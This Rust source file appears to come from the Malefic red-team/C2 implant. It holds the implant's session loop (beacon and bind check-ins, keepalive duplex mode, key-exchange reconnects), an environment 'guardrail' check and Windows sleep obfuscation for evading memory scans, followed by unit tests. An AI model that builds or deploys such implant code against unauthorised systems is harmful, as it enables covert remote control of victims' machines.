use std::time::{Duration, Instant};

use async_trait::async_trait;
use futures_timer::Delay;
use malefic_common::debug;
use malefic_proto::proto::implantpb::{spite::Body, Spites};
use malefic_stub::stub::MaleficStub;
use malefic_transport::{ConnectionRunner, TransportError};

const DUPLEX_IDLE_POLL_INTERVAL: Duration = Duration::from_millis(1);

/// Typed session errors so callers can distinguish network failures from handler bugs.
#[derive(Debug, thiserror::Error)]
pub enum SessionError {
    #[error("transport: {0}")]
    Transport(#[from] TransportError),
    #[error("handler: {0}")]
    Handler(anyhow::Error),
}

pub fn enforce_guardrail() {
    #[cfg(feature = "guardrail")]
    {
        malefic_guardrail::Guardrail::check(malefic_sysinfo::get_sysinfo());
    }
}

#[async_trait]
pub trait SessionIo {
    async fn send(&mut self, spites: Spites) -> Result<(), TransportError>;
    async fn receive(&mut self) -> Result<Option<Spites>, TransportError>;
    fn try_receive(&mut self) -> Result<Option<Spites>, TransportError>;
    fn upgrade(&mut self) -> Result<(), TransportError>;
    async fn downgrade(&mut self) -> Result<(), TransportError>;
}

#[async_trait]
impl SessionIo for ConnectionRunner {
    async fn send(&mut self, spites: Spites) -> Result<(), TransportError> {
        ConnectionRunner::send(self, spites).await
    }

    async fn receive(&mut self) -> Result<Option<Spites>, TransportError> {
        ConnectionRunner::receive(self).await
    }

    fn try_receive(&mut self) -> Result<Option<Spites>, TransportError> {
        ConnectionRunner::try_receive(self)
    }

    fn upgrade(&mut self) -> Result<(), TransportError> {
        ConnectionRunner::upgrade(self)
    }

    async fn downgrade(&mut self) -> Result<(), TransportError> {
        ConnectionRunner::downgrade(self).await
    }
}

#[async_trait]
pub trait SessionActor {
    async fn prepare_request(&mut self) -> anyhow::Result<Spites>;
    async fn prepare_spites(&mut self) -> anyhow::Result<Spites>;
    async fn handle(&mut self, spites: Spites) -> anyhow::Result<()>;
    fn reset_keepalive_state(&mut self);
    fn keepalive_enabled(&self) -> bool;
    fn contains_key_exchange_response(&self, spites: &Spites) -> bool;
    fn mark_key_exchange_response_sent(&mut self);
    fn should_reconnect_after_key_exchange(&mut self) -> bool;
    fn should_reconnect_for_switch(&self) -> bool;
    fn heartbeat_interval(&self) -> Duration;
    fn create_ping(&self) -> Spites;
}

#[async_trait]
impl SessionActor for MaleficStub {
    async fn prepare_request(&mut self) -> anyhow::Result<Spites> {
        MaleficStub::prepare_request(self).await
    }

    async fn prepare_spites(&mut self) -> anyhow::Result<Spites> {
        MaleficStub::prepare_spites(self).await
    }

    async fn handle(&mut self, spites: Spites) -> anyhow::Result<()> {
        MaleficStub::handler(self, spites).await
    }

    fn reset_keepalive_state(&mut self) {
        MaleficStub::reset_keepalive_state(self);
    }

    fn keepalive_enabled(&self) -> bool {
        self.keepalive_enabled
    }

    fn contains_key_exchange_response(&self, spites: &Spites) -> bool {
        MaleficStub::contains_key_exchange_response(spites)
    }

    fn mark_key_exchange_response_sent(&mut self) {
        #[cfg(feature = "secure")]
        self.meta.mark_key_exchange_response_sent();
    }

    fn should_reconnect_after_key_exchange(&mut self) -> bool {
        MaleficStub::should_reconnect_after_key_exchange(self)
    }

    fn should_reconnect_for_switch(&self) -> bool {
        MaleficStub::should_reconnect_for_switch(self)
    }

    fn heartbeat_interval(&self) -> Duration {
        Duration::from_millis(self.meta.new_heartbeat())
    }

    fn create_ping(&self) -> Spites {
        MaleficStub::create_ping()
    }
}

#[async_trait]
pub trait SessionStrategy<A: SessionActor, R: SessionIo> {
    async fn heartbeat_iteration(&mut self, actor: &mut A, runner: &mut R) -> anyhow::Result<()>;

    async fn after_iteration(&mut self, _actor: &mut A) -> anyhow::Result<()> {
        Ok(())
    }
}

#[derive(Default)]
pub struct BeaconStrategy;

#[async_trait]
impl<A, R> SessionStrategy<A, R> for BeaconStrategy
where
    A: SessionActor + Send,
    R: SessionIo + Send,
{
    async fn heartbeat_iteration(&mut self, actor: &mut A, runner: &mut R) -> anyhow::Result<()> {
        let request = actor.prepare_request().await?;
        send_actor_spites(actor, runner, request).await?;

        if let Some(response) = runner.receive().await? {
            actor.handle(response).await?;
        }

        Ok(())
    }

    async fn after_iteration(&mut self, actor: &mut A) -> anyhow::Result<()> {
        let heartbeat_interval = actor.heartbeat_interval();
        #[cfg(all(target_os = "windows", feature = "sleep_obf"))]
        {
            use malefic_os_win::sleep::{obf_sleep_ms, ObfMode, Obfuscation};
            obf_sleep_ms(
                core::ptr::null_mut(),
                0,
                heartbeat_interval.as_millis() as u64,
                Obfuscation::Timer,
                ObfMode::Rwx | ObfMode::Heap,
            );
        }
        #[cfg(not(all(target_os = "windows", feature = "sleep_obf")))]
        {
            Delay::new(heartbeat_interval).await;
        }
        Ok(())
    }
}

#[derive(Default)]
pub struct BindStrategy;

#[async_trait]
impl<A, R> SessionStrategy<A, R> for BindStrategy
where
    A: SessionActor + Send,
    R: SessionIo + Send,
{
    async fn heartbeat_iteration(&mut self, actor: &mut A, runner: &mut R) -> anyhow::Result<()> {
        if let Some(request) = runner.receive().await? {
            actor.handle(request).await?;
            let response = actor.prepare_request().await?;
            send_actor_spites(actor, runner, response).await?;
        }

        Ok(())
    }
}

enum LoopControl {
    Continue,
    Reconnect,
}

pub struct SessionLoop<S> {
    strategy: S,
}

impl<S> SessionLoop<S> {
    pub fn new(strategy: S) -> Self {
        Self { strategy }
    }
}

impl<S> SessionLoop<S> {
    pub async fn run<A, R>(&mut self, actor: &mut A, runner: &mut R) -> Result<(), SessionError>
    where
        A: SessionActor + Send,
        R: SessionIo + Send,
        S: SessionStrategy<A, R> + Send,
    {
        actor.reset_keepalive_state();

        if actor.keepalive_enabled()
            && matches!(
                Self::run_keepalive_session(actor, runner)
                    .await
                    .map_err(classify_error)?,
                LoopControl::Reconnect
            )
        {
            return Ok(());
        }

        loop {
            self.strategy
                .heartbeat_iteration(actor, runner)
                .await
                .map_err(classify_error)?;

            if actor.should_reconnect_after_key_exchange() {
                return Ok(());
            }

            if actor.should_reconnect_for_switch() {
                return Ok(());
            }

            if actor.keepalive_enabled() {
                match Self::run_keepalive_session(actor, runner)
                    .await
                    .map_err(classify_error)?
                {
                    LoopControl::Continue => {}
                    LoopControl::Reconnect => return Ok(()),
                }
            }

            self.strategy
                .after_iteration(actor)
                .await
                .map_err(classify_error)?;
        }
    }

    async fn run_keepalive_session<A, R>(
        actor: &mut A,
        runner: &mut R,
    ) -> anyhow::Result<LoopControl>
    where
        A: SessionActor + Send,
        R: SessionIo + Send,
    {
        runner.upgrade()?;
        let outcome = Self::run_duplex(actor, runner).await?;
        runner.downgrade().await?;
        Ok(outcome)
    }

    async fn run_duplex<A, R>(actor: &mut A, runner: &mut R) -> anyhow::Result<LoopControl>
    where
        A: SessionActor + Send,
        R: SessionIo + Send,
    {
        let interval = actor.heartbeat_interval();
        let mut last_heartbeat = Instant::now();

        loop {
            let mut had_activity = false;

            if let Some(request) = runner.try_receive()? {
                actor.handle(request).await?;
                had_activity = true;
            }

            let spites = actor.prepare_spites().await?;
            if !spites.spites.is_empty() {
                send_actor_spites(actor, runner, spites).await?;
                last_heartbeat = Instant::now();
                had_activity = true;
            } else if last_heartbeat.elapsed() >= interval {
                send_actor_spites(actor, runner, actor.create_ping()).await?;
                last_heartbeat = Instant::now();
            }

            if actor.should_reconnect_after_key_exchange() {
                return Ok(LoopControl::Reconnect);
            }

            if actor.should_reconnect_for_switch() {
                return Ok(LoopControl::Reconnect);
            }

            if !actor.keepalive_enabled() {
                return Ok(LoopControl::Continue);
            }

            if !had_activity {
                Delay::new(DUPLEX_IDLE_POLL_INTERVAL).await;
            }
        }
    }
}

/// Classify an `anyhow::Error` as transport or handler.
fn classify_error(e: anyhow::Error) -> SessionError {
    match e.downcast::<TransportError>() {
        Ok(te) => SessionError::Transport(te),
        Err(other) => SessionError::Handler(other),
    }
}

async fn send_actor_spites<A, R>(
    actor: &mut A,
    runner: &mut R,
    spites: Spites,
) -> anyhow::Result<()>
where
    A: SessionActor + Send,
    R: SessionIo + Send,
{
    #[cfg(debug_assertions)]
    if is_ping_only(&spites) {
        debug!("[session] Sending ping");
    }

    let sent_key_exchange = actor.contains_key_exchange_response(&spites);
    runner.send(spites).await?;
    if sent_key_exchange {
        actor.mark_key_exchange_response_sent();
    }
    Ok(())
}

fn is_ping_only(spites: &Spites) -> bool {
    matches!(
        spites.spites.as_slice(),
        [spite] if matches!(spite.body.as_ref(), Some(Body::Ping(_)))
    )
}

#[cfg(test)]
mod tests {
    use std::collections::VecDeque;
    use std::time::Duration;

    use async_trait::async_trait;
    use malefic_proto::proto::implantpb::spite::Body;
    use malefic_proto::proto::implantpb::Spites;
    use malefic_proto::proto::modulepb;
    use malefic_proto::{new_empty_spite, new_spite};
    use malefic_transport::TransportError;

    use super::{BeaconStrategy, BindStrategy, SessionActor, SessionIo, SessionLoop};

    #[derive(Default)]
    struct FakeRunner {
        log: Vec<&'static str>,
        receive_queue: VecDeque<Option<Spites>>,
        try_receive_queue: VecDeque<Option<Spites>>,
        sent: Vec<Spites>,
        upgrade_count: usize,
        downgrade_count: usize,
        send_error: Option<TransportError>,
        receive_error: Option<TransportError>,
        upgrade_error: Option<TransportError>,
    }

    #[async_trait]
    impl SessionIo for FakeRunner {
        async fn send(&mut self, spites: Spites) -> Result<(), TransportError> {
            self.log.push("send");
            if let Some(err) = self.send_error.take() {
                return Err(err);
            }
            self.sent.push(spites);
            Ok(())
        }

        async fn receive(&mut self) -> Result<Option<Spites>, TransportError> {
            self.log.push("receive");
            if let Some(err) = self.receive_error.take() {
                return Err(err);
            }
            Ok(self.receive_queue.pop_front().flatten())
        }

        fn try_receive(&mut self) -> Result<Option<Spites>, TransportError> {
            self.log.push("try_receive");
            Ok(self.try_receive_queue.pop_front().flatten())
        }

        fn upgrade(&mut self) -> Result<(), TransportError> {
            self.log.push("upgrade");
            if let Some(err) = self.upgrade_error.take() {
                return Err(err);
            }
            self.upgrade_count += 1;
            Ok(())
        }

        async fn downgrade(&mut self) -> Result<(), TransportError> {
            self.log.push("downgrade");
            self.downgrade_count += 1;
            Ok(())
        }
    }

    struct FakeActor {
        keepalive_enabled: bool,
        reset_count: usize,
        handled: Vec<String>,
        prepare_request_queue: VecDeque<Spites>,
        prepare_spites_queue: VecDeque<Spites>,
        reconnect_on_handle_name: Option<&'static str>,
        reconnect_on_mark: bool,
        pending_reconnect: bool,
        marked_key_exchange: usize,
        heartbeat_interval: Duration,
        pending_switch: bool,
    }

    impl Default for FakeActor {
        fn default() -> Self {
            Self {
                keepalive_enabled: false,
                reset_count: 0,
                handled: Vec::new(),
                prepare_request_queue: VecDeque::new(),
                prepare_spites_queue: VecDeque::new(),
                reconnect_on_handle_name: None,
                reconnect_on_mark: false,
                pending_reconnect: false,
                marked_key_exchange: 0,
                heartbeat_interval: Duration::from_millis(0),
                pending_switch: false,
            }
        }
    }

    #[async_trait]
    impl SessionActor for FakeActor {
        async fn prepare_request(&mut self) -> anyhow::Result<Spites> {
            Ok(self
                .prepare_request_queue
                .pop_front()
                .unwrap_or_else(|| empty_spites("noop_request")))
        }

        async fn prepare_spites(&mut self) -> anyhow::Result<Spites> {
            Ok(self
                .prepare_spites_queue
                .pop_front()
                .unwrap_or_else(|| Spites { spites: vec![] }))
        }

        async fn handle(&mut self, spites: Spites) -> anyhow::Result<()> {
            for spite in spites.spites {
                let name = spite.name.clone();
                if name == "keepalive" {
                    let enable = match spite.body.as_ref() {
                        Some(Body::Common(common)) => {
                            common.bool_array.first().copied().unwrap_or(false)
                        }
                        _ => false,
                    };
                    self.keepalive_enabled = enable;
                }

                if self
                    .reconnect_on_handle_name
                    .is_some_and(|target| target == name)
                {
                    self.pending_reconnect = true;
                }

                self.handled.push(name);
            }
            Ok(())
        }

        fn reset_keepalive_state(&mut self) {
            self.reset_count += 1;
        }

        fn keepalive_enabled(&self) -> bool {
            self.keepalive_enabled
        }

        fn contains_key_exchange_response(&self, spites: &Spites) -> bool {
            spites
                .spites
                .iter()
                .any(|spite| matches!(spite.body.as_ref(), Some(Body::KeyExchangeResponse(_))))
        }

        fn mark_key_exchange_response_sent(&mut self) {
            self.marked_key_exchange += 1;
            if self.reconnect_on_mark {
                self.pending_reconnect = true;
            }
        }

        fn should_reconnect_after_key_exchange(&mut self) -> bool {
            let reconnect = self.pending_reconnect;
            self.pending_reconnect = false;
            reconnect
        }

        fn should_reconnect_for_switch(&self) -> bool {
            self.pending_switch
        }

        fn heartbeat_interval(&self) -> Duration {
            self.heartbeat_interval
        }

        fn create_ping(&self) -> Spites {
            empty_spites("ping")
        }
    }

    fn empty_spites(name: &str) -> Spites {
        Spites {
            spites: vec![new_empty_spite(1, name.to_string())],
        }
    }

    fn keepalive_spites(enable: bool) -> Spites {
        Spites {
            spites: vec![new_spite(
                1,
                "keepalive".to_string(),
                Body::Common(modulepb::CommonBody {
                    bool_array: vec![enable],
                    ..Default::default()
                }),
            )],
        }
    }

    fn key_exchange_response_spites() -> Spites {
        Spites {
            spites: vec![new_spite(
                1,
                "key_exchange".to_string(),
                Body::KeyExchangeResponse(modulepb::KeyExchangeResponse {
                    public_key: "server-public-key".to_string(),
                }),
            )],
        }
    }

    #[test]
    fn beacon_strategy_sends_before_receiving() {
        let mut actor = FakeActor {
            prepare_request_queue: VecDeque::from([empty_spites("beacon_request")]),
            reconnect_on_handle_name: Some("beacon_response"),
            ..Default::default()
        };
        let mut runner = FakeRunner {
            receive_queue: VecDeque::from([Some(empty_spites("beacon_response"))]),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BeaconStrategy);

        futures::executor::block_on(session_loop.run(&mut actor, &mut runner)).unwrap();

        assert_eq!(actor.reset_count, 1);
        assert_eq!(actor.handled, vec!["beacon_response".to_string()]);
        assert_eq!(runner.log, vec!["send", "receive"]);
    }

    #[test]
    fn bind_strategy_receives_before_sending() {
        let mut actor = FakeActor {
            prepare_request_queue: VecDeque::from([empty_spites("bind_response")]),
            reconnect_on_handle_name: Some("bind_request"),
            ..Default::default()
        };
        let mut runner = FakeRunner {
            receive_queue: VecDeque::from([Some(empty_spites("bind_request"))]),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BindStrategy);

        futures::executor::block_on(session_loop.run(&mut actor, &mut runner)).unwrap();

        assert_eq!(actor.reset_count, 1);
        assert_eq!(actor.handled, vec!["bind_request".to_string()]);
        assert_eq!(runner.log, vec!["receive", "send"]);
    }

    #[test]
    fn keepalive_session_upgrades_and_downgrades_before_resuming_heartbeat() {
        let mut actor = FakeActor {
            keepalive_enabled: true,
            prepare_request_queue: VecDeque::from([empty_spites("bind_response")]),
            reconnect_on_handle_name: Some("bind_request"),
            ..Default::default()
        };
        let mut runner = FakeRunner {
            try_receive_queue: VecDeque::from([Some(keepalive_spites(false))]),
            receive_queue: VecDeque::from([Some(empty_spites("bind_request"))]),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BindStrategy);

        futures::executor::block_on(session_loop.run(&mut actor, &mut runner)).unwrap();

        assert_eq!(runner.upgrade_count, 1);
        assert_eq!(runner.downgrade_count, 1);
        assert_eq!(
            actor.handled,
            vec!["keepalive".to_string(), "bind_request".to_string()]
        );
    }

    #[test]
    fn key_exchange_response_in_duplex_triggers_reconnect() {
        let mut actor = FakeActor {
            keepalive_enabled: true,
            prepare_spites_queue: VecDeque::from([key_exchange_response_spites()]),
            reconnect_on_mark: true,
            ..Default::default()
        };
        let mut runner = FakeRunner::default();
        let mut session_loop = SessionLoop::new(BeaconStrategy);

        futures::executor::block_on(session_loop.run(&mut actor, &mut runner)).unwrap();

        assert_eq!(actor.marked_key_exchange, 1);
        assert_eq!(runner.upgrade_count, 1);
        assert_eq!(runner.downgrade_count, 1);
        assert_eq!(runner.sent.len(), 1);
        assert_eq!(runner.sent[0].spites[0].name, "key_exchange");
    }

    #[test]
    fn switch_detection_causes_reconnect() {
        let mut actor = FakeActor {
            pending_switch: true,
            prepare_request_queue: VecDeque::from([empty_spites("req")]),
            ..Default::default()
        };
        let mut runner = FakeRunner {
            receive_queue: VecDeque::from([Some(empty_spites("resp"))]),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BeaconStrategy);

        let result = futures::executor::block_on(session_loop.run(&mut actor, &mut runner));
        assert!(result.is_ok());
        assert_eq!(actor.handled, vec!["resp".to_string()]);
        assert_eq!(runner.log, vec!["send", "receive"]);
    }

    #[test]
    fn send_error_propagates() {
        let mut actor = FakeActor::default();
        let mut runner = FakeRunner {
            send_error: Some(TransportError::SendError),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BeaconStrategy);

        let result = futures::executor::block_on(session_loop.run(&mut actor, &mut runner));
        assert!(result.is_err());
        assert_eq!(runner.log, vec!["send"]);
    }

    #[test]
    fn receive_error_propagates() {
        let mut actor = FakeActor {
            prepare_request_queue: VecDeque::from([empty_spites("req")]),
            ..Default::default()
        };
        let mut runner = FakeRunner {
            receive_error: Some(TransportError::ConnectionReset),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BeaconStrategy);

        let result = futures::executor::block_on(session_loop.run(&mut actor, &mut runner));
        assert!(result.is_err());
        assert_eq!(runner.log, vec!["send", "receive"]);
    }

    #[test]
    fn upgrade_error_propagates_when_keepalive() {
        let mut actor = FakeActor {
            keepalive_enabled: true,
            ..Default::default()
        };
        let mut runner = FakeRunner {
            upgrade_error: Some(TransportError::ConnectFailed("test".into())),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BeaconStrategy);

        let result = futures::executor::block_on(session_loop.run(&mut actor, &mut runner));
        assert!(result.is_err());
        assert_eq!(runner.log, vec!["upgrade"]);
        assert_eq!(runner.upgrade_count, 0);
    }

    #[test]
    fn multiple_heartbeat_iterations() {
        let mut actor = FakeActor {
            prepare_request_queue: VecDeque::from([
                empty_spites("req1"),
                empty_spites("req2"),
                empty_spites("req3"),
            ]),
            reconnect_on_handle_name: Some("trigger_reconnect"),
            ..Default::default()
        };
        let mut runner = FakeRunner {
            receive_queue: VecDeque::from([
                Some(empty_spites("resp1")),
                Some(empty_spites("resp2")),
                Some(empty_spites("trigger_reconnect")),
            ]),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BeaconStrategy);

        let result = futures::executor::block_on(session_loop.run(&mut actor, &mut runner));
        assert!(result.is_ok());
        assert_eq!(
            actor.handled,
            vec![
                "resp1".to_string(),
                "resp2".to_string(),
                "trigger_reconnect".to_string(),
            ]
        );
        assert_eq!(
            runner.log,
            vec!["send", "receive", "send", "receive", "send", "receive"]
        );
    }

    #[test]
    fn keepalive_enable_disable_in_heartbeat() {
        // Flow: heartbeat (keepalive=false initially) → receive keepalive(true) →
        // keepalive becomes true → upgrade → duplex try_receive keepalive(false) →
        // keepalive becomes false → downgrade → heartbeat → receive triggers reconnect
        let mut actor = FakeActor {
            keepalive_enabled: false,
            reconnect_on_handle_name: Some("done"),
            ..Default::default()
        };
        let mut runner = FakeRunner {
            receive_queue: VecDeque::from([
                Some(keepalive_spites(true)), // 1st heartbeat: enables keepalive
                Some(empty_spites("done")),   // 2nd heartbeat: triggers reconnect
            ]),
            try_receive_queue: VecDeque::from([
                Some(keepalive_spites(false)), // duplex: disables keepalive
            ]),
            ..Default::default()
        };
        let mut session_loop = SessionLoop::new(BeaconStrategy);

        let result = futures::executor::block_on(session_loop.run(&mut actor, &mut runner));
        assert!(result.is_ok());
        assert_eq!(runner.upgrade_count, 1);
        assert_eq!(runner.downgrade_count, 1);
        assert_eq!(
            actor.handled,
            vec![
                "keepalive".to_string(), // from 1st heartbeat receive
                "keepalive".to_string(), // from duplex try_receive
                "done".to_string(),      // from 2nd heartbeat receive
            ]
        );
    }
}
